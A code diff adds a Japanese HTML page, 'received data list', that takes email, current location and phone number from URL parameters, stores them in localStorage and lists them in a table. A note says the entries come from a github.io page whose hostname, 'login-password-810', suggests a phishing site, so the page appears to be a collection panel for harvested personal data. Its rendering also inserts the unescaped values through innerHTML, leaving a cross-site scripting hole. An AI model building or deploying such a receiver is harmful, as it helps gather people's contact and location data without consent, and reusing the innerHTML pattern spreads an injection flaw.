@@ -1,0 +1,166 @@
+<!DOCTYPE html>
+<html lang="ja">
+<head>
+<meta charset="UTF-8" />
+<meta name="viewport" content="width=device-width, initial-scale=1.0"/>
+<title>受信データ一覧</title>
+<style>
+  body{
+    margin:0;
+    min-height:100vh;
+    display:grid;
+    place-items:center;
+    background:#f4f6fb;
+    font-family: system-ui, -apple-system, "Noto Sans JP", sans-serif;
+    color:#333;
+  }
+  .card{
+    width:min(96vw, 900px);
+    background:#fff;
+    border-radius:14px;
+    padding:20px;
+    box-shadow:0 20px 40px rgba(0,0,0,.1);
+  }
+  h1{ margin:0 0 14px; font-size:18px; }
+  .note{ font-size:12px; color:#777; margin-bottom:12px; }
+
+  table{
+    width:100%;
+    border-collapse:collapse;
+    font-size:14px;
+  }
+  th, td{
+    padding:10px;
+    border-bottom:1px solid #e5e7eb;
+    text-align:left;
+    white-space:nowrap;
+  }
+  th{ background:#f8fafc; font-weight:600; }
+  tr:hover td{ background:#fafcff; }
+
+  button{
+    border:none;
+    border-radius:8px;
+    padding:6px 10px;
+    cursor:pointer;
+    font-size:12px;
+  }
+  .del{ background:#ffe3e3; color:#c92a2a; }
+  .clear{ background:#e7f0ff; color:#1c5cff; margin-bottom:10px; }
+
+  .empty{
+    text-align:center;
+    color:#888;
+    padding:20px 0;
+  }
+</style>
+</head>
+<body>
+
+<div class="card">
+  <h1>📥 受信データ一覧</h1>
+  <div class="note">
+    ※ https://login-password-810.github.io/username.github.io/から受信したデモデータを保存・表示しています
+  </div>
+
+  <button class="clear" id="clearAll">すべて削除</button>
+
+  <table id="table">
+    <thead>
+      <tr>
+        <th>受信時刻</th>
+        <th>メール</th>
+        <th>現在地</th>
+        <th>電話番号</th>
+        <th>操作</th>
+      </tr>
+    </thead>
+    <tbody></tbody>
+  </table>
+
+  <div class="empty" id="emptyMsg">まだ受信データはありません</div>
+</div>
+
+<script>
+/* ---------- 設定 ---------- */
+const STORAGE_KEY = "received_demo_data";
+
+/* ---------- URLから新規受信 ---------- */
+const params = new URLSearchParams(location.search);
+const email   = params.get("email");
+const address = params.get("address");
+const phone   = params.get("phone");
+
+if (email || address || phone) {
+  const list = JSON.parse(localStorage.getItem(STORAGE_KEY) || "[]");
+
+  list.push({
+    id: Date.now(),
+    time: new Date().toLocaleString(),
+    email: email || "",
+    address: address || "",
+    phone: phone || ""
+  });
+
+  localStorage.setItem(STORAGE_KEY, JSON.stringify(list));
+
+  // URLをきれいに（リロード時に二重登録防止）
+  history.replaceState(null, "", location.pathname);
+}
+
+/* ---------- 表示処理 ---------- */
+function render() {
+  const tbody = document.querySelector("#table tbody");
+  const empty = document.getElementById("emptyMsg");
+  const list = JSON.parse(localStorage.getItem(STORAGE_KEY) || "[]");
+
+  tbody.innerHTML = "";
+
+  if (list.length === 0) {
+    empty.style.display = "block";
+    return;
+  }
+
+  empty.style.display = "none";
+
+  list.forEach(item => {
+    const tr = document.createElement("tr");
+
+    tr.innerHTML = `
+      <td>${item.time}</td>
+      <td>${item.email}</td>
+      <td>${item.address}</td>
+      <td>${item.phone}</td>
+      <td>
+        <button class="del" data-id="${item.id}">削除</button>
+      </td>
+    `;
+
+    tbody.appendChild(tr);
+  });
+}
+
+/* ---------- 削除（1件） ---------- */
+document.addEventListener("click", e => {
+  if (!e.target.classList.contains("del")) return;
+
+  const id = Number(e.target.dataset.id);
+  let list = JSON.parse(localStorage.getItem(STORAGE_KEY) || "[]");
+  list = list.filter(item => item.id !== id);
+  localStorage.setItem(STORAGE_KEY, JSON.stringify(list));
+  render();
+});
+
+/* ---------- 全削除 ---------- */
+document.getElementById("clearAll").addEventListener("click", () => {
+  if (!confirm("すべて削除しますか？")) return;
+  localStorage.removeItem(STORAGE_KEY);
+  render();
+});
+
+/* 初期表示 */
+render();
+</script>
+
+</body>
+</html>
